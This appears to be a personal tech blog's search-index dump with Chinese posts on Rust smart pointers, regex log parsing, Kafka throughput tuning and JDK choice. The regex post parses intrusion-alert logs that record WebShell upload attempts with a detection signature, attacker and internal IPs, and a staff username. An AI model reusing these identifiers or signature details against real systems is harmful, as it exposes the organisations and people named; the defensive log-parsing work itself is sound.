中的匿名函数，可以用来定义简单的函数逻辑。使用 closures 可以在编译时进行类型推断和代码优化，从而避免在运行时进行类型检查和内存分配。 引用与智能指针的区别? 引用（\u0026amp;T）和智能指针（如 Box\u0026lt;T\u0026gt; 和 Rc\u0026lt;T\u0026gt;）都是用来处理内存管理的类型。它们的主要区别在于，引用是一个不可变的指向某个值的指针，而智能指针是一种带有额外特性的指针，它不仅能保证数据的安全，还能自动管理内存的分配和释放。比如，Box\u0026lt;T\u0026gt; 类型的智能指针用于在堆上分配内存，并自动在指针离开作用域时释放内存；Rc\u0026lt;T\u0026gt; 类型的智能指针则用于维护引用计数，并在引用计数为 0 时释放内存。\nDeref 是什么？ Deref coercion converts a reference to a type that implements the Deref trait into a reference to another type. For example, deref coercion can convert \u0026amp;String to \u0026amp;str because String implements the Deref trait such that it returns \u0026amp;str .\nRust calls deref to turn the \u0026amp;String into \u0026amp;str \u0026amp;str 来自对 String 切片（用 \u0026amp; 与 [..]） \u0026amp;String 是类型为 String 的数据的引用 不存在类型：str 如何选择智能指针？ The Box\u0026lt;T\u0026gt; type has a known size and points to data allocated on the heap. The Rc\u0026lt;T\u0026gt; type keeps track of the number of references to data on the heap so that data can have multiple owners. The RefCell\u0026lt;T\u0026gt; type with its interior mutability gives us a type that we can use when we need an immutable type but need to change an inner value of that type; it also enforces the borrowing rules at runtime instead of at compile time. 引用循环会泄漏内存？ Reference variable 可以 drop 且 reference count 可以递减，但它指向的实例或值在堆上却不能被 drop，由于引用循环，实例的 reference count 不为零\u0026hellip;\u0026hellip;\n强引用与弱引用的区别？ 在我看来 strong reference 与 weak reference：\ndrop 或者 clean up 时弱引用忽略不计 Weak 引用的值可能已被删除 clone、downgrade、upgrade Rc 是强（被）引用类型，Weak 是弱（被）引用类型 如何构造树？ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 use std::cell::RefCell; use std::rc::{Rc, Weak}; #[derive(Debug)] struct Node { value: i32, // 从结点到父结点是弱引用（防止因引用循环而泄漏内存 // 更改其父节点 parent: RefCell\u0026lt;Weak\u0026lt;Node\u0026gt;\u0026gt;, // 从结点到子结点是强引用（ 当结点被 drop 时，它的子结点也应该被 drop // 结点能够被其它变量引用（允许多个 onwers // 更改哪些结点是另一个结点的字结点 children: RefCell\u0026lt;Vec\u0026lt;Rc\u0026lt;Node\u0026gt;\u0026gt;\u0026gt;, } 如何构造线程池？ 本文首发于 https://h2cone.github.io\n其它 The Rust Programming Language\nString vs \u0026amp;str in Rust\nArrays, vectors and slices in Rust\nOpen API # ChatGPT\n","date":"2022-12-04T21:17:41+08:00","permalink":"https://h2cone.github.io/2022/12/04/rust_rookie_qa/","title":"Rust 八股"},{"content":"前言 正则表达式是指定文本中搜索模式的字符序列，这种模式被字符串搜索算法用于对字符串进行查找、替换、校验等。\n拆分 在日志解析领域，时常遇到满足特定模式的日志条目，比如“头部”是时间信息，“身体”是详细信息的日志条目：\n1 2 % cat a0.log \u0026lt;30\u0026gt;May 21 21:33:47 localhost alert: {category=漏洞扫描事件} {type=WebShell} {priority=提示} {typeCN=Web后门} {level=6} {id=974609} {time=2018-05-21 21:33:04} {sip=101.206.169.180} {sport=49187} {dip=10.1.186.7} {dport=9084} {host=m.****.com.cn:9084} {code=200} {sysurl=/sys/web_session.php?level=6\u0026amp;sid=974609} {attach=/sys/web_session.php?act=download\u0026amp;level=6\u0026amp;sid=974609} {intent=上传可执行脚本或WebShell文件} {detail=在Post数据包中发现含有JSP/ASP/ASP.NET代码特征的字符：\u0026lt;%request/QueryString/Form/[\u0026#39;...\u0026#39;]%\u0026gt;} {dev=zonghang01} {url=http://m.****.com.cn:9084/pmobile/MCPerEAccountSignTrs.do} 人脑能够从少量日志条目归纳出日志的格式，也能从程序开发者的角度看见日志的结构，但是计算机只有在人类的指导（声明字符串满足的模式）下才能区分日志条目的各个组成部分。\n1 2 3 % cat a0.log | sd \u0026#39;(\u0026lt;\\d+\u0026gt;\\w+\\s+\\d{1,2}\\s+\\d{2}:\\d{2}:\\d{2}\\s+\\w+\\s+\\w+:\\s+)(.+)\u0026#39; \u0026#39;$1\\n$2\u0026#39; \u0026lt;30\u0026gt;May 21 21:33:47 localhost alert: {category=漏洞扫描事件} {type=WebShell} {priority=提示} {typeCN=Web后门} {level=6} {id=974609} {time=2018-05-21 21:33:04} {sip=101.206.169.180} {sport=49187} {dip=10.1.186.7} {dport=9084} {host=m.****.com.cn:9084} {code=200} {sysurl=/sys/web_session.php?level=6\u0026amp;sid=974609} {attach=/sys/web_session.php?act=download\u0026amp;level=6\u0026amp;sid=974609} {intent=上传可执行脚本或WebShell文件} {detail=在Post数据包中发现含有JSP/ASP/ASP.NET代码特征的字符：\u0026lt;%request/QueryString/Form/[\u0026#39;...\u0026#39;]%\u0026gt;} {dev=zonghang01} {url=http://m.****.com.cn:9084/pmobile/MCPerEAccountSignTrs.do} 命令行工具 sd 用于在文本中查找与替换，它既支持基于字面量的查找，也支持基于正则表达式的查找。上文整条命令表示将文件 a1.log 输入到 sd，它第一个参数是替换前字符串满足的模式（正则表达式），第二个参数是替换后的字符串格式，从输出结果可以看到日志条目的“头部”和“身体”之间已通过行分隔符 \\n 分隔，相当于拆分成两个部分。\n正则表达式通常包含元字符，其中 (X) 表示一个组（Group）的一名成员 X，一个组是正则表达式匹配到的一个子字符串，通过从 0 开始且步长为 1 的单调递增的索引（index）定位各名成员（子子字符串）。\n1 2 % echo \u0026#39;lizzy 2 2002\u0026#39; | sd \u0026#39;(\\w+)\\s+(\\d+)\\s+(\\d+)\u0026#39; \u0026#39;name: $1, gender: $2, birth: $3, raw: \u0026#34;$0\u0026#34;\u0026#39; name: lizzy, gender: 2, birth: 2002, raw: \u0026#34;lizzy 2 2002\u0026#34; 索引为 0 的成员始终代表整个组。\n提取键值对 使用正则表达式作用于文本可能匹配到一个或多个组，每个组又能按照索引拆分。\n1 2 % cat a1.log \u0026lt;30\u0026gt;May 21 22:01:16 localhost alert: {category=漏洞扫描事件} {type=WebShell} {priority=提示} {typeCN=Web后门} {level=6} {id=974612} {time=2018-05-21 22:01:12} {sip=125.45.235.110} {sport=42425} {dip=10.1.186.5} {dport=9223} {host=ebank.****.com.cn:9223} {code=200} {sysurl=/sys/web_session.php?level=6\u0026amp;sid=974612} {attach=/sys/web_session.php?act=download\u0026amp;level=6\u0026amp;sid=974612} {intent=上传可执行脚本或WebShell文件} {detail=在Post数据包中发现含有JSP/ASP/ASP.NET代码特征的字符：\u0026lt;%request/QueryString/Form/[\u0026#39;...\u0026#39;]%\u0026gt;} {dev=zonghang01} {url=http://ebank.****.com.cn:9223/pWeb/FP410803.do?Wdserialno=CIP06A029396} 使用 Java APIs 从 a1.log 提取用户感兴趣的信息，例如键值对。\n1 2 3 4 5 6 7 8 9 10 String text = Files.readString(Paths.get(\u0026#34;/path/to/a1.log\u0026#34;)); // 移除转义后的表达式为 \\{(\\w+?)=(.+?)} Pattern pattern = Pattern.compile(\u0026#34;\\\\{(\\\\w+?)=(.+?)}\u0026#34;); Matcher matcher = pattern.matcher(text); while (matcher.find()) { String kv = matcher.group(0); String k = matcher.group(1); String v = matcher.group(2); System.out.printf(\u0026#34;%s \u0026lt;=\u0026gt; %s -\u0026gt; %s\u0026#34; + System.lineSeparator(), kv, k, v); } 标准输出如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 {category=漏洞扫描事件} \u0026lt;=\u0026gt; category -\u0026gt; 漏洞扫描事件 {type=WebShell} \u0026lt;=\u0026gt; type -\u0026gt; WebShell {priority=提示} \u0026lt;=\u0026gt; priority -\u0026gt; 提示 {typeCN=Web后门} \u0026lt;=\u0026gt; typeCN -\u0026gt; Web后门 {level=6} \u0026lt;=\u0026gt; level -\u0026gt; 6 {id=974612} \u0026lt;=\u0026gt; id -\u0026gt; 974612 {time=2018-05-21 22:01:12} \u0026lt;=\u0026gt; time -\u0026gt; 2018-05-21 22:01:12 {sip=125.45.235.110} \u0026lt;=\u0026gt; sip -\u0026gt; 125.45.235.110 {sport=42425} \u0026lt;=\u0026gt; sport -\u0026gt; 42425 {dip=10.1.186.5} \u0026lt;=\u0026gt; dip -\u0026gt; 10.1.186.5 {dport=9223} \u0026lt;=\u0026gt; dport -\u0026gt; 9223 {host=ebank.****.com.cn:9223} \u0026lt;=\u0026gt; host -\u0026gt; ebank.****.com.cn:9223 {code=200} \u0026lt;=\u0026gt; code -\u0026gt; 200 {sysurl=/sys/web_session.php?level=6\u0026amp;sid=974612} \u0026lt;=\u0026gt; sysurl -\u0026gt; /sys/web_session.php?level=6\u0026amp;sid=974612 {attach=/sys/web_session.php?act=download\u0026amp;level=6\u0026amp;sid=974612} \u0026lt;=\u0026gt; attach -\u0026gt; /sys/web_session.php?act=download\u0026amp;level=6\u0026amp;sid=974612 {intent=上传可执行脚本或WebShell文件} \u0026lt;=\u0026gt; intent -\u0026gt; 上传可执行脚本或WebShell文件 {detail=在Post数据包中发现含有JSP/ASP/ASP.NET代码特征的字符：\u0026lt;%request/QueryString/Form/[\u0026#39;...\u0026#39;]%\u0026gt;} \u0026lt;=\u0026gt; detail -\u0026gt; 在Post数据包中发现含有JSP/ASP/ASP.NET代码特征的字符：\u0026lt;%request/QueryString/Form/[\u0026#39;...\u0026#39;]%\u0026gt; {dev=zonghang01} \u0026lt;=\u0026gt; dev -\u0026gt; zonghang01 {url=http://ebank.****.com.cn:9223/pWeb/FP410803.do?Wdserialno=CIP06A029396} \u0026lt;=\u0026gt; url -\u0026gt; http://ebank.****.com.cn:9223/pWeb/FP410803.do?Wdserialno=CIP06A029396 即使“头部”有干扰项的日志条目，也不能排除找不到精准的正则表达式去匹配键值对。\n1 2 % cat b0.log \u0026lt;134\u0026gt;Mar 17 14:16:11 CMFEACLOG01 BA[5100]:[log_type:flux][record_time:2022-03-17 14:12.24] [user:liujt2] [group:/****/23基金核算部/][host_ip:192.168.79.78][dst_ip:::][serv:访问网站][app:款件下裁][site:未定义位置] [tm_type:/PC/MAC PC][up_flux:120][down_flux:120] 梅开二度：\n1 2 3 4 5 6 7 8 9 10 String text = Files.readString(Paths.get(\u0026#34;/path/to/b0.log\u0026#34;)); // 移除转义后的表达式为 \\[(\\w+?):(.+?)] Pattern pattern = Pattern.compile(\u0026#34;\\\\[(\\\\w+?):(.+?)]\u0026#34;); Matcher matcher = pattern.matcher(text); while (matcher.find()) { String kv = matcher.group(0); String k = matcher.group(1); String v = matcher.group(2); System.out.printf(\u0026#34;%s \u0026lt;=\u0026gt; %s -\u0026gt; %s\u0026#34; + System.lineSeparator(), kv, k, v); } 符合预期：\n1 2 3 4 5 6 7 8 9 10 11 12 [log_type:flux] \u0026lt;=\u0026gt; log_type -\u0026gt; flux [record_time:2022-03-17 14:12.24] \u0026lt;=\u0026gt; record_time -\u0026gt; 2022-03-17 14:12.24 [user:liujt2] \u0026lt;=\u0026gt; user -\u0026gt; liujt2 [group:/****/23基金核算部/] \u0026lt;=\u0026gt; group -\u0026gt; /****/23基金核算部/ [host_ip:192.168.79.78] \u0026lt;=\u0026gt; host_ip -\u0026gt; 192.168.79.78 [dst_ip:::] \u0026lt;=\u0026gt; dst_ip -\u0026gt; :: [serv:访问网站] \u0026lt;=\u0026gt; serv -\u0026gt; 访问网站 [app:款件下裁] \u0026lt;=\u0026gt; app -\u0026gt; 款件下裁 [site:未定义位置] \u0026lt;=\u0026gt; site -\u0026gt; 未定义位置 [tm_type:/PC/MAC PC] \u0026lt;=\u0026gt; tm_type -\u0026gt; /PC/MAC PC [up_flux:120] \u0026lt;=\u0026gt; up_flux -\u0026gt; 120 [down_flux:120] \u0026lt;=\u0026gt; down_flux -\u0026gt; 120 非专业人士也许不懂正则表达式，倒有一种更直观的键值对提取方案，用户至少填写 2 个分隔符：\n要求切除的前缀，默认为 null。 要求切除的后缀，默认为 null。 键值对之间的分隔符，不能为 null。 键与值之间的分隔符，不能为 null。 是否删除值头尾引号，默认为 false。 假设键值对之间的分隔符是 pairSeparator，而键与值之间的分隔符是 kvSeparator，伪代码如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 String[] pairs = text.split(Pattern.quote(pairSeparator)); if (ArrayUtils.isEmpty(pairs)) { return; } Map\u0026lt;String, Object\u0026gt; kv = new HashMap\u0026lt;\u0026gt;(keys.size()); String lastKey = null; for (String pair : pairs) { int first = pair.indexOf(kvSeparator); if (first \u0026gt; 0) { String key = pair.substring(0, first); if (StringUtils.isNotBlank(key)) { String value = pair.substring(key.length() + kvSeparator.length()); kv.put(key, value); lastKey = key; } } else { // 将孤独的值追加到上一对键值 if (StringUtils.isNotBlank(lastKey)) { Object lastValue = kv.get(lastKey); if (Objects.nonNull(lastValue)) { kv.put(lastKey, lastValue + pairSeparator + pair); } } } } 方法 split 的坑 说起字符串分隔，方法 split 的参数可是正则表达式！\n1 2 3 4 5 String str = \u0026#34;a=1} {b=2} {c=3\u0026#34;; String separator = \u0026#34;} {\u0026#34;; // java.util.regex.PatternSyntaxException: Illegal repetition near index 3 // } { String[] pairs = str.split(separator); 输入的分隔符包含元字符会被当作正则表达式来校验和解析，除了转义，另一种基于字面量的分隔技巧：\n1 String[] pairs = str.split(Pattern.quote(separator)); 查找与替换 最近在捣鼓一系列大数据集，遇到了类似于 JSON lines 的文件，理想情况下它们每一行都是一个有效的 JSON 值，遗憾的是它们是二手资料：\n1 2 3 4 5 6 7 8 % cat ****_sample_750k/person_info.json | jq type \u0026#34;object\u0026#34; \u0026#34;object\u0026#34; parse error: Invalid numeric literal at line 3, column 289 % cat ****_sample_750k/address_merge_with_mobile_data.json | jq type parse error: Invalid numeric literal at line 1, column 95 % cat ****_sample_750k/case_data_index.json | jq type parse error: Invalid numeric literal at line 1, column 118 通过 jq 可以快速定位哪些行不是有效的 JSON，视察后使用 sd 等工具将其就地（in-place）替换成合规的 JSON。\n1 2 3 4 5 6 7 8 #!/bin/bash file=****_sample_750k/person_info.json sd -s \u0026#39;\u0026#34;{\u0026#39; \u0026#39;{\u0026#39; $file sd -s \u0026#39;}\u0026#34;\u0026#39; \u0026#39;}\u0026#39; $file sd -s \u0026#39;简称\u0026#34;中专\u0026#34;\u0026#39; \u0026#39;简称中专\u0026#39; $file sd -s \u0026#39;简称\u0026#34;大学\u0026#34;\u0026#39; \u0026#39;简称大学\u0026#39; $file echo \u0026#39;\u0026#34;]}}}\u0026#39; \u0026gt;\u0026gt; $file cat $file | jq type 选项 -s 就是 sd 的字符串字面量模式（将表达式视为非正则字符串），但是可能发生“误伤”或“越界”，因为剩余两个类 JSON lines 文件的某些字符串类型的字段的值包含一些 JSON 元字符：\n1 \u0026#34;field\u0026#34;:\u0026#34;内容{内容}内容\u0026#34; （内容可能为空白）\n1 \u0026#34;field\u0026#34;:\u0026#34;内容\u0026#34;内容\u0026#34;内容\u0026#34; 混合使用正则模式与非正则模式来修复：\n1 2 3 4 5 6 #!/bin/bash file=****_sample_750k/address_merge_with_mobile_data.json sd \u0026#39;\u0026#34;\\{(.+?)}\u0026#34;\u0026#39; \u0026#39;{$1}\u0026#39; $file export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-17.jdk/Contents/Home \u0026amp;\u0026amp; java StrFieldReplace.java $file echo \u0026#39;\u0026#34;}}\u0026#39; \u0026gt;\u0026gt; $file cat $file | jq type 其中脚本 StrFieldReplace.java 的实现如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 public class StrFieldReplace { static final Pattern[] PATTERNS = new Pattern[]{ // \u0026#34;SRC_ADDRESS\u0026#34;:\u0026#34;(.+?)\u0026#34;,\u0026#34;SRC_ID\u0026#34; Pattern.compile(\u0026#34;\\\u0026#34;SRC_ADDRESS\\\u0026#34;:\\\u0026#34;(.+?)\\\u0026#34;,\\\u0026#34;SRC_ID\\\u0026#34;\u0026#34;), // \u0026#34;BRIEF_CASE\u0026#34;:\u0026#34;(.+?)\u0026#34;,\u0026#34;CASE_TYPE\u0026#34; Pattern.compile(\u0026#34;\\\u0026#34;BRIEF_CASE\\\u0026#34;:\\\u0026#34;(.+?)\\\u0026#34;,\\\u0026#34;CASE_TYPE\\\u0026#34;\u0026#34;), // \u0026#34;CASE_ADDRESS\u0026#34;:\u0026#34;(.+?)\u0026#34;} Pattern.compile(\u0026#34;\\\u0026#34;CASE_ADDRESS\\\u0026#34;:\\\u0026#34;(.+?)\\\u0026#34;}\u0026#34;), // \u0026#34;case_address\u0026#34;:\u0026#34;(.+?)\u0026#34;,\u0026#34;\\w+?\u0026#34; Pattern.compile(\u0026#34;\\\u0026#34;case_address\\\u0026#34;:\\\u0026#34;(.+?)\\\u0026#34;,\\\u0026#34;\\\\w+?\\\u0026#34;\u0026#34;), // \u0026#34;caseAddress\u0026#34;:\u0026#34;(.+?)\u0026#34;,\u0026#34;\\w+?\u0026#34; Pattern.compile(\u0026#34;\\\u0026#34;caseAddress\\\u0026#34;:\\\u0026#34;(.+?)\\\u0026#34;,\\\u0026#34;\\\\w+?\\\u0026#34;\u0026#34;), // \u0026#34;CASE_NAME\u0026#34;:\u0026#34;(.+?)\u0026#34;,\u0026#34;CASE_NUMBER\u0026#34; Pattern.compile(\u0026#34;\\\u0026#34;CASE_NAME\\\u0026#34;:\\\u0026#34;(.+?)\\\u0026#34;,\\\u0026#34;CASE_NUMBER\\\u0026#34;\u0026#34;), }; static final Map\u0026lt;String, String\u0026gt; REGEX_REPL = Map.of( // \u0026#34; -\u0026gt; \u0026#39; \u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026#39;\u0026#34; ); public static void main(String[] args) throws IOException { if (args.length \u0026lt; 1) { System.err.println(\u0026#34;Usage: java StrFieldReplace.java \u0026lt;pathToFile\u0026gt;\u0026#34;); System.exit(1); } String pathToFile = args[0]; Path filepath = Paths.get(pathToFile); List\u0026lt;String\u0026gt; lines = Files.readAllLines(filepath); if (lines.isEmpty()) { System.err.println(filepath + \u0026#34; is empty\u0026#34;); return; } for (int i = 0; i \u0026lt; lines.size(); i++) { String line = lines.get(i); for (Pattern pattern : PATTERNS) { Matcher matcher = pattern.matcher(line); while (matcher.find()) { String value = matcher.group(1); for (Map.Entry\u0026lt;String, String\u0026gt; entry : REGEX_REPL.entrySet()) { String regex = entry.getKey(); String repl = entry.getValue(); String newValue = value.replaceAll(regex, repl); line = line.replace(value, newValue); lines.set(i, line); value = newValue; } } } } Files.writeString(filepath, String.join(System.lineSeparator(), lines)); } } 此处，基于字面量替换比基于正则替换更快，在行替换比在全文替换更快。\n1 2 3 4 5 6 #!/bin/bash file=****_sample_750k/case_data_index.json sd \u0026#39;\u0026#34;ADDR_DETL\u0026#34;:\u0026#34;\\{(.+?)}\u0026#34;,\u0026#34;ADDR_TYPE\u0026#34;\u0026#39; \u0026#39;\u0026#34;ADDR_DETL\u0026#34;:{$1},\u0026#34;ADDR_TYPE\u0026#34;\u0026#39; $file export JAVA_HOME=/Library/Java/JavaVirtualMachines/zulu-17.jdk/Contents/Home \u0026amp;\u0026amp; java StrFieldReplace.java $file sd -s \u0026#39;\u0026#34;{\u0026#39; \u0026#39;{\u0026#39; $file \u0026amp;\u0026amp; echo \u0026#39;\u0026#34;:null}}}}\u0026#39; \u0026gt;\u0026gt; $file cat $file | jq type 本文首发于 https://h2cone.github.io\n文本校验 通常始于一行的开头 ^，终于一行的结尾 $。\n参考 Wiki # Regular expression\nOracle # Class Pattern\nregex101: build, test, and debug regex\n","date":"2022-07-15T10:31:49+08:00","permalink":"https://h2cone.github.io/2022/07/15/regex_use_cases/","title":"正则表达式用例"},{"content":"写在前面的话 团队围绕着 Kafka 一系列服务的压力测试的核心指标之一是 Eevents per second，排除其它因素，它与吞吐量正相关。\n什么是吞吐量 吞吐量是指通过通信通道成功传递消息的速率。从 Kafka 生产者（Producer）的角度来看，可以用单位时间内交付成功的记录条数或大小来描述吞吐量；从 Kafka 消费者（Consumer）的角度来看，可以用单位时间内读取的记录条数或大小来描述。\n生产者准备记录包含业务逻辑，此处只关注单位时间内接收到回执（ack）的记录条数或大小。默认情况下，生产者使用异步发送，且它将尝试在内存中累积记录并在单个请求中发送批量记录。\n1 2 3 for (long i = 0; i \u0026lt; numRecords; i++) { producer.send(record, callback); } 调用方法 KafkaProducer.send(ProducerRecord, Callback) 不阻塞在该方法，既传递记录（record）的引用，也传递回调（callback）的引用。\n1 2 3 4 5 6 class MyCallback implements Callback { @Override public void onCompletion(RecordMetadata metadata, Exception e) { // handling } } 生产者接受到发送记录的回执时，将有线程执行方法 onCompletion 的代码，我们可以在回调方法体内实现记录条数或大小的累计。\n注意：“提交偏移量”不一定发生在“处理记录”之后。\n1 2 3 4 while (conditions) { ConsumerRecords records = consumer.poll(timeout); processRetrievedRecords(records); } 消费者处理记录包含业务逻辑，此处只关注单位时间内接受到的记录条数或大小。默认情况下，消费者通过轮询拉取（poll）批量的记录，每次调用方法 KafkaConsumer.poll(Duration) 阻塞在该方法，直到超时（timeout）返回，且会有线程定期透明地提交前一批的最后一条记录的偏移量（auto commit）。\n测试吞吐量 生产者工具 在 Kafka 安装目录，有助于测试生产者性能的命令行工具是 kafka-producer-perf-test.sh。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 % ./bin/kafka-producer-perf-test.sh --help usage: producer-performance [-h] --topic TOPIC --num-records NUM-RECORDS [--payload-delimiter PAYLOAD-DELIMITER] --throughput THROUGHPUT [--producer-props PROP-NAME=PROP-VALUE [PROP-NAME=PROP-VALUE ...]] [--producer.config CONFIG-FILE] [--print-metrics] [--transactional-id TRANSACTIONAL-ID] [--transaction-duration-ms TRANSACTION-DURATION] (--record-size RECORD-SIZE | --payload-file PAYLOAD-FILE) This tool is used to verify the producer performance. optional arguments: -h, --help show this help message and exit --topic TOPIC produce messages to this topic --num-records NUM-RECORDS number of messages to produce --payload-delimiter PAYLOAD-DELIMITER provides delimiter to be used when --payload-file is provided. Defaults to new line. Note that this parameter will be ignored if --payload-file is not provided. (default: \\n) --throughput THROUGHPUT throttle maximum message throughput to *approximately* THROUGHPUT messages/sec. Set this to -1 to disable throttling. --producer-props PROP-NAME=PROP-VALUE [PROP-NAME=PROP-VALUE ...] kafka producer related configuration properties like bootstrap.servers,client.id etc. These configs take precedence over those passed via --producer.config. --producer.config CONFIG-FILE producer config properties file. --print-metrics print out metrics at the end of the test. (default: false) --transactional-id TRANSACTIONAL-ID The transactionalId to use if transaction-duration-ms is \u0026gt; 0. Useful when testing the performance of concurrent transactions. (default: performance-producer-default-transactional-id) --transaction-duration-ms TRANSACTION-DURATION The max age of each transaction. The commitTransaction will be called after this time has elapsed. Transactions are only enabled if this value is positive. (default: 0) either --record-size or --payload-file must be specified but not both. --record-size RECORD-SIZE message size in bytes. Note that you must provide exactly one of --record-size or --payload-file. --payload-file PAYLOAD-FILE file to read the message payloads from. This works only for UTF-8 encoded text files. Payloads will be read from this file and a payload will be randomly selected when sending messages. Note that you must provide exactly one of --record-size or --payload-file. 查看 kafka-producer-perf-test.sh 不难发现实际执行 ProducerPerformance 的方法 main。\n1 2 3 4 5 6 7 % ./bin/kafka-producer-perf-test.sh \\ --topic perf_test \\ --num-records 1000000 \\ --record-size 1024 \\ --throughput -1 \\ --producer-props \\ bootstrap.servers=localhost:9092 发送 1000000 条大小为 1024 字节的记录到地址为 localhost:9092 的 Kafka Broker 的主题 perf_test，输出包含 records/sec 或 MB/sec 是我们关注的吞吐量。\n1 2 498505 records sent, 99701.0 records/sec (97.36 MB/sec), 1.4 ms avg latency, 176.0 ms max latency. 1000000 records sent, 102722.136620 records/sec (100.31 MB/sec), 0.92 ms avg latency, 176.00 ms max latency, 0 ms 50th, 1 ms 95th, 23 ms 99th, 56 ms 99.9th. 消费者工具 另一方面，命令行工具 kafka-consumer-perf-test.sh 有助于对消费者进行性能测试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 % ./bin/kafka-consumer-perf-test.sh --help This tool helps in performance test for the full zookeeper consumer Option Description ------ ----------- --bootstrap-server \u0026lt;String: server to REQUIRED unless --broker-list connect to\u0026gt; (deprecated) is specified. The server (s) to connect to. --broker-list \u0026lt;String: broker-list\u0026gt; DEPRECATED, use --bootstrap-server instead; ignored if --bootstrap- server is specified. The broker list string in the form HOST1:PORT1, HOST2:PORT2. --consumer.config \u0026lt;String: config file\u0026gt; Consumer config properties file. --date-format \u0026lt;String: date format\u0026gt; The date format to use for formatting the time field. See java.text. SimpleDateFormat for options. (default: yyyy-MM-dd HH:mm:ss:SSS) --fetch-size \u0026lt;Integer: size\u0026gt; The amount of data to fetch in a single request. (default: 1048576) --from-latest If the consumer does not already have an established offset to consume from, start with the latest message present in the log rather than the earliest message. --group \u0026lt;String: gid\u0026gt; The group id to consume on. (default: perf-consumer-20714) --help Print usage information. --hide-header If set, skips printing the header for the stats --messages \u0026lt;Long: count\u0026gt; REQUIRED: The number of messages to send or consume --num-fetch-threads \u0026lt;Integer: count\u0026gt; DEPRECATED AND IGNORED: Number of fetcher threads. (default: 1) --print-metrics Print out the metrics. --reporting-interval \u0026lt;Integer: Interval in milliseconds at which to interval_ms\u0026gt; print progress info. (default: 5000) --show-detailed-stats If set, stats are reported for each reporting interval as configured by reporting-interval --socket-buffer-size \u0026lt;Integer: size\u0026gt; The size of the tcp RECV size. (default: 2097152) --threads \u0026lt;Integer: count\u0026gt; DEPRECATED AND IGNORED: Number of processing threads. (default: 10) --timeout [Long: milliseconds] The maximum allowed time in milliseconds between returned records. (default: 10000) --topic \u0026lt;String: topic\u0026gt; REQUIRED: The topic to consume from. --version Display Kafka version. 查看 kafka-consumer-perf-test.sh 不难发现实际执行 ConsumerPerformance 的方法 main。\n1 2 3 4 ./bin/kafka-consumer-perf-test.sh \\ --broker-list localhost:9092 \\ --topic perf_test \\ --messages 1000000 从地址是 localhost:9092 的 Kafka Broker 的主题 perf_test 索取 1000000 条记录，输出结果包含列名 nMsg.sec 是我们关注的吞吐量。\n1 2 start.time, end.time, data.consumed.in.MB, MB.sec, data.consumed.in.nMsg, nMsg.sec, rebalance.time.ms, fetch.time.ms, fetch.MB.sec, fetch.nMsg.sec 2022-07-02 11:39:47:948, 2022-07-02 11:39:49:374, 976.9287, 685.0832, 1000375, 701525.2454, 187, 1239, 788.4816, 807405.1655 理论配置 完全受到 Summary of Configurations for Optimizing Throughput 的启发。\n生产者配置 batch.size。批次大小。批处理时（当多个记录被发送到同一个分区时）累积记录不超过指定字节数，超过时立即发送批量记录。建议增加到 100000 ~ 200000。默认为 16384。\nlinger.ms。逗留时长。批处理时（当多个记录被发送到同一个分区时）累积记录不超过指定毫秒数，超过时立即发送批量记录。属性 linger.ms 优先于属性 batch.size。默认为 0。\ncompression.type=lz4。压缩类型。默认值是 none，表示不压缩。\nacks=1。生产者要求在 Leader 考虑请求完成之前收到的 ack 数量。默认值是 all，Kafka 3.0 之前的默认值是 1。\nbuffer.memory。缓冲记录的内存总字节数。如果有很多分区就增加它，默认为 33554432。\n消费者配置 fetch.min.bytes。一个索取请求（fetch request）要求服务端返回的最小字节数。增加到 100000，默认为 1。\nfetch.max.wait.ms=500。一个索取请求（fetch request）要求服务端未累积到 fetch.min.bytes 的最大阻塞毫秒数。\n验证配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 % ./bin/kafka-producer-perf-test.sh \\ --topic perf_test \\ --num-records 1000000 \\ --record-size 1024 \\ --throughput -1 \\ --producer-props \\ bootstrap.servers=localhost:9092 \\ batch.size=100000 \\ linger.ms=10 \\ compression.type=lz4 \\ acks=1 \\ buffer.memory=33554432 489179 records sent, 97835.8 records/sec (95.54 MB/sec), 3.0 ms avg latency, 421.0 ms max latency. 1000000 records sent, 102637.791235 records/sec (100.23 MB/sec), 2.22 ms avg latency, 421.00 ms max latency, 1 ms 50th, 5 ms 95th, 39 ms 99th, 90 ms 99.9th. 上面的配置使用 lz4 压缩算法，而下面的配置不使用压缩在某些指标表现得更好。\n1 2 3 4 5 6 7 8 9 10 11 12 13 % ./bin/kafka-producer-perf-test.sh \\ --topic perf_test \\ --num-records 1000000 \\ --record-size 1024 \\ --throughput -1 \\ --producer-props \\ bootstrap.servers=localhost:9092 \\ batch.size=100000 \\ linger.ms=10 \\ acks=1 \\ buffer.memory=33554432 558625 records sent, 111680.3 records/sec (109.06 MB/sec), 1.8 ms avg latency, 197.0 ms max latency. 1000000 records sent, 114207.400640 records/sec (111.53 MB/sec), 1.87 ms avg latency, 197.00 ms max latency, 1 ms 50th, 5 ms 95th, 20 ms 99th, 48 ms 99.9th. 亲自走“调参-测试”循环，方可迭代到更适合自己的最佳实践。\n本文首发于 https://h2cone.github.io\n参考 Kafka Design | Confluent Documentation\nKafka - When to commit?\nOptimizing for Throughput | Confluent Documentation\n","date":"2022-06-20T10:16:16+08:00","permalink":"https://h2cone.github.io/2022/06/20/high_throughput_kafka_client_config/","title":"高吞吐 Kafka 客户端配置"},{"content":"个人选择 公司中的遗留项目基于 Java 8，也有部署使用 Java 11 的开源软件；对于 Side Project，甚至是新项目，可以毫不犹豫使用 Java 11/17。个人嫌在 Oracle 官方下载 JDK 过于麻烦，也非 100% 开源，加上本地操作系统指令集架构从 x86 转到了 ARM，因此决定下载 Azul Zulu Builds of OpenJDK。\n市面上各家厂商构建的 JDK 不可能毫无差异，比如 OpenJDK 与 Oracle JDK – 比较表。\n向后兼容 Java 8 有时被称为 Java 